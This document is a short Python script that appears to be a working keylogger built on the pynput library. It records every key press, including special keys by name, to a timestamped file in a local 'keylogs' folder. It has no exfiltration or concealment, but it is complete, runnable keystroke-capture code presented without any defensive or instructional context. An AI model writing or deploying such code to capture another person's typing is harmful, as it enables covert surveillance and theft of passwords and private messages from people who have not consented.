from pynput import keyboard
from datetime import datetime
import os

# Directory to save the logs
LOG_DIR = "keylogs"
os.makedirs(LOG_DIR, exist_ok=True)

# Log file name with timestamp
log_file = os.path.join(LOG_DIR, f"keylog_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt")

# Function to write a key event to the log file
def write_to_file(key):
    try:
        with open(log_file, "a") as f:
            # Check if the key is a special key (like 'esc') or a character
            if isinstance(key, keyboard.Key):
                f.write(f"[{key.name}]\n")  # Writing special key name
            else:
                f.write(key.char + "\n")  # Writing character key
    except Exception as e:
        print(f"Error while writing to file: {e}")

# Callback function when a key is pressed
def on_press(key):
    write_to_file(key)

# Start capturing key events
if __name__ == "__main__":
    print(f"Keylogger started. Logging to: {log_file}")
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()
